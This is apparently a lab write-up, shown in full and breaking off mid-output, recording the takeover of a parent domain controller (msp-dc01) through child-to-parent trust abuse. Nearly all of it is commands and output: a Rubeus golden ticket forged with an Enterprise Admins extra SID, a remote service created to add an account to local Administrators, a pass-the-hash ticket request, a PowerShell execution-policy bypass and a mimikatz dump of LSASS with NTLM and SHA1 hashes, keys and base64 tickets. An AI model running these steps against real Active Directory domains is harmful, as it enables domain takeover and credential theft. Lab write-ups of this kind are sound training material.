---
layout: default
---

## msp-dc01 192.168.250.1

In order to access to msp-dc01.msp.local it's possible abusse of child-parent relationship:

### 1. child to parent relationship internal.msp.local to msp.local


```
.\Rubeus.exe golden /user:Administrator /id:500 /domain:internal.msp.local /sid:S-1-5-21-2754435719-1041067879-922430489 /groups:513 /sids:S-1-5-21-2998733414-582960673-4099777928-519 /aes256:cc20c8162d769beb5deb56ba94be4b8f18e09ef3e119cbb1a857a92597dcf3ee /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : INTERNAL.MSP.LOCAL (INTERNAL)
[*] SID            : S-1-5-21-2754435719-1041067879-922430489
[*] UserId         : 500
[*] Groups         : 513
[*] ExtraSIDs      : S-1-5-21-2998733414-582960673-4099777928-519
[*] ServiceKey     : CC20C8162D769BEB5DEB56BA94BE4B8F18E09EF3E119CBB1A857A92597DCF3EE
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : CC20C8162D769BEB5DEB56BA94BE4B8F18E09EF3E119CBB1A857A92597DCF3EE
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : internal.msp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@internal.msp.local'

[*] AuthTime       : 7/23/2024 11:29:54 AM
[*] StartTime      : 7/23/2024 11:29:54 AM
[*] EndTime        : 7/23/2024 9:29:54 PM
[*] RenewTill      : 7/30/2024 11:29:54 AM

[*] base64(ticket.kirbi):

      doIF1zCCBdOgAwIBBaEDAgEWooIErjCCBKphggSmMIIEoqADAgEFoRQbEklOVEVSTkFMLk1TUC5MT0NB
      TKInMCWgAwIBAqEeMBwbBmtyYnRndBsSaW50ZXJuYWwubXNwLmxvY2Fso4IEWjCCBFagAwIBEqEDAgED
      ooIESASCBERPvx/qmYhvo01DzYYY+UL3dt3p+S1uGtRqTB8rT76R09hwqUTrGCH9XVhxkf/GBrhddQr4
      JHzz6r34PL2sZ6HipsRyqCWJshTjU18ggmbVRxuKrWUuT9jl04b6p41lWRoRTkEMhn8HJlEziEUo6EfZ
      HGglqaHhXFgf5fczBg6z5NlvNo+VWXW/I7d3UcQJevI+i2Y2UfcuXKmfzBknklaXIwtss4TYInHn84tv
      dReJlovY1eYEVJfDMWLxsLHzaf/PPvKcC6OxFSmQFRUIz+iDVxZZyBPqw8NkbH6/shypc/jtcrmD6xx7
      olEea6dkshkpvKJQo+R5gMQ0Igw7aQldwWTLLtfKO5eIb8hSYMpDedg4mqHLQ0dLk2670PX8fxOwMBcf
      qUPQ419cqokIdkRDm0XMbWmeULu05l5WNZKTasaSYNmcprPOMZTMYSmV/hhsI+S901qm0jX3jQY9dQUd
      0ZFCByk/tROntg2hipfbmCpqxV61E7bwGno+yge6I4gW5syNsJkiMq/rAcySDD1jfpRfLISuv9YTZCp9
      UZl+FpMRtZjLoelY/K8WA0MCsHUNIjhxp8EHL1JF6g3wcnF1xKlf7b4ApdoIbKuHAUdPYszyPXXfpEBh
      2HX9ni4cacCsuUAv41OJevNFwYUKJx9t9ETPJmfsCWdc31/pj14iWOLgmGWAJhjssy3Hi5AT0VuCASEM
      T0D3I0jpcJMJvib7vROQz1GU1c2UUGdwtR1GEfeic9wrd8p8h0Eia2VAEpcFrRr99YYnCKk/PgTuS/OZ
      EqfcJgpXZs8Q+wtz9gy7KTkYJtDRetm9pRA207S8rxmKRMvld+JDdt+yFaTlxUDrpJruMy3Knb45zuxI
      J6xRcIjIZPvo69nAih+L2U9dtkEtqlvmbWTmnH+5stqMvg+DaFTIHDTkfBFUf9zDksKnkJwgGdvmtesQ
      QcTJgXy2LdLorKkhHgxQNyw8YnIgas2wWCvM9MfBmu5buWJM2OmEoCI6sHqwKRPPBWa75NJiUNMKQW5U
      vvYl0poezhgTZpiDOC0WFdJxYcF7/8hqmn0MT0/DzBTNuepJITOZhcDSVDt/7a26gZm+8kB6MlgBBhAd
      AdRMkT9gvJBIOn5LH1Bk/JCpxPru/giBOzWhX0Zvj24vDqwWgaxTyyUXWPuuNRg5zCBfyTZ5qdtwsQvu
      7WxWvwFvSnFPoDBX4uOSlpfHS2MD8aB5CrIpL4BqlhJGG9sR0c9LKMA4fK5GcgmNY1FH3+Lcu6OqaykM
      B5jStMzjZWt024WqRUTs9vii5Cua9bIv/RRJlYiMCNrCz3MjAxw9enC0KnKdStBu0H3wJjpvkWYUocWb
      A0U31KVdQKtLU3CCJmKKNzfjJhSIaeeEYV83f4qIBcQRV4v/RI2CYX8rXFZiyuHOl8MACXDjkwWx+X7t
      Tf4aPJ2cZy3C9xfkkBkI7tSzxyijggETMIIBD6ADAgEAooIBBgSCAQJ9gf8wgfyggfkwgfYwgfOgKzAp
      oAMCARKhIgQgjZJxLhu5BACXS03mkWM2+bNQTZt0dWSoHgNkA4flqKWhFBsSSU5URVJOQUwuTVNQLkxP
      Q0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI0MDcyMzE4Mjk1NFql
      ERgPMjAyNDA3MjMxODI5NTRaphEYDzIwMjQwNzI0MDQyOTU0WqcRGA8yMDI0MDczMDE4Mjk1NFqoFBsS
      SU5URVJOQUwuTVNQLkxPQ0FMqScwJaADAgECoR4wHBsGa3JidGd0GxJpbnRlcm5hbC5tc3AubG9jYWw=


[+] Ticket successfully imported!

```

create new service on the parent domain:

```
dir \\msp-dc01.msp.local\C$\
 Volume in drive \\msp-dc01.msp.local\C$ has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of \\msp-dc01.msp.local\C$

10/02/2020  05:21 AM    <DIR>          PerfLogs
02/13/2024  05:24 AM    <DIR>          Program Files
05/26/2019  03:00 AM    <DIR>          Program Files (x86)
02/14/2024  01:23 PM    <DIR>          Transcripts
06/07/2024  12:30 AM    <DIR>          Users
02/15/2024  06:10 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  12,148,137,984 bytes free

C:\Users\Administrator>cmd /c sc \\msp-dc01.msp.local create ADD binPath= "cmd /c net localgroup Administrators internalmsp\Administrator /add"
cmd /c sc \\msp-dc01.msp.local create ADD binPath= "cmd /c net localgroup Administrators internalmsp\Administrator /add"
[SC] CreateService SUCCESS
```

Include new user on local Administrators:

```
C:\Users\Administrator>cmd /c sc \\msp-dc01.msp.local start ADD
cmd /c sc \\msp-dc01.msp.local start ADD
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### 2. Access to msp-dc01.msp.local

```
C:\Users\mspdb\Documents>.\Rubeus.exe asktgt /domain:internal.msp.local /user:Administrator /ntlm:3be591c12e5b21818dccf376674fcba6 /ptt
.\Rubeus.exe asktgt /domain:internal.msp.local /user:Administrator /ntlm:3be591c12e5b21818dccf376674fcba6 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3be591c12e5b21818dccf376674fcba6
[*] Building AS-REQ (w/ preauth) for: 'internal.msp.local\Administrator'
[*] Using domain controller: 192.168.250.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/internal.msp.local
  ServiceRealm             :  INTERNAL.MSP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  INTERNAL.MSP.LOCAL
  StartTime                :  6/7/2024 1:35:02 AM
  EndTime                  :  6/7/2024 11:35:02 AM
  RenewTill                :  6/14/2024 1:35:02 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  1Tq4Exx0XIQMGtd9+UzadA==
  ASREP (key)              :  3BE591C12E5B21818DCCF376674FCBA6


C:\Users\mspdb\Documents>Enter-PSSession -ComputerName msp-dc01
Enter-PSSession -ComputerName msp-dc01
'Enter-PSSession' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\mspdb\Documents>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mspdb\Documents> Enter-PSSession -ComputerName msp-dc01
Enter-PSSession -ComputerName msp-dc01

```
### 3. Validate Admin user include local Adminsitrators user

```
[msp-dc01]: PS C:\Users\Administrator.INTERNAL\Documents> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
INTERNALMSP\Administrator
The command completed successfully.
```

### 4. Dump Lsass process and LSA

```
[msp-dc01]: PS C:\Users\Administrator.INTERNAL\Documents> cmd /c C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "lsadump::lsa /patch" "exit"
cmd /c C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "lsadump::lsa /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 31498 (00000000:00007b0a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 805735 (00000000:000c4b67)
Session           : RemoteInteractive from 2
User Name         : administrator
Domain            : MSP
Logon Server      : MSP-DC01
Logon Time        : 4/28/2024 11:57:25 PM
SID               : S-1-5-21-2998733414-582960673-4099777928-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MSP
         * NTLM     : 5ab419bf7ce8fc7c9dcc3c5f2fcf5714
         * SHA1     : 903cef78563ac41132650c2159df1ea043e205f6
         * DPAPI    : 4f44d7fef93f7e87f97767f1cce80906
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 748655 (00000000:000b6c6f)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:56:52 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 49585 (00000000:0000c1b1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 31547 (00000000:00007b3b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 27587 (00000000:00006bc3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:51 PM
SID               :
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MSP-DC01$
Domain            : MSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:51 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : msp-dc01$
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 749644 (00000000:000b704c)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:56:52 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 749580 (00000000:000b700c)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:56:52 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 748704 (00000000:000b6ca0)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:56:52 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-DC01$
         * Domain   : msp.local
         * Password : 79 1d a4 e8 fc f7 48 c1 1b 3f fd fc e1 17 a0 56 86 95 00 5c 60 3e a2 4b 03 26 23 75 16 e5 bf 9c 44 38 2c 93 48 d8 d1 20 c1 ea eb bc 84 cb 71 57 f2 c6 d2 c8 5d e3 18 9b 50 a4 d5 ed c7 04 fe 3b 5d 5b 26 59 0b 50 22 5d 80 e7 45 cc ef 89 0e 8f 1c 4b 69 20 16 2d 7a 37 b8 d1 be b3 eb 3c 3d ed e2 3f a7 de a0 96 f2 aa 0a d5 86 0a 70 41 ef 57 e4 35 de 3b 37 fb 6c c9 2f ba 0f fa 5c d5 82 a9 09 d2 4b 31 fb ff df 1c 18 d8 96 98 c9 b4 a1 cb f1 71 b6 88 23 e0 12 14 f8 eb 68 98 9f e3 68 46 0e 83 92 eb 5e 75 99 1e 7a 27 24 fa 10 01 ca bd 15 ac a0 38 ab 8f 2f 39 1d 75 19 70 ee 21 2c ca 82 99 4f 84 67 91 fb 0c 9b de c3 7b 1a a3 30 20 13 ca 6f 42 03 ff 50 e8 63 b6 db 84 7f 8f fc 0c fa 41 d8 a2 07 39 b8 3b 62 90 9e 6f c8 f9 c2 63
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MSP-DC01$
Domain            : MSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
         * DPAPI    : 7263d9855727c0aac27b599b031a0f89
        tspkg :
        wdigest :
         * Username : MSP-DC01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : msp-dc01$
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31544 (00000000:00007b38)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:48:53 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MSP-DC01$
         * Domain   : MSP
         * NTLM     : a35ce596e7f4a7af3cf2e50e13760977
         * SHA1     : 7263d9855727c0aac27b599b031a0f898b834ff1
